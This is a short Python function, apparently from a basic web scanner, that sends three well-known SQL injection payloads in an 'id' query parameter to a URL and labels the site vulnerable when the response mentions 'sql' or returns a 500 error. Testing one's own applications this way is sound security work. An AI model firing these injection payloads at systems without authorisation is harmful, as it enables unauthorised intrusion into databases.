import requests
from colorama import Fore, Style

def test_sql_injection(url):
    param = "id"
    payloads = ["1 OR 1=1", "' OR '1'='1", "' OR '1'='1' --"]
    print(f"\nSQL Injection test for {url}:\n")
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url)
            if "sql" in response.text.lower() or response.status_code == 500:
                print(f"{Fore.RED}[VULNERABLE] {Style.RESET_ALL}Possible SQL Injection: {test_url}")
            else:
                print(f"{Fore.LIGHTGREEN_EX}[SAFE] {Style.RESET_ALL}No SQL Injection detected for payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[ERROR] {Style.RESET_ALL} Failed to test SQL Injection for {url}. Error: {e}")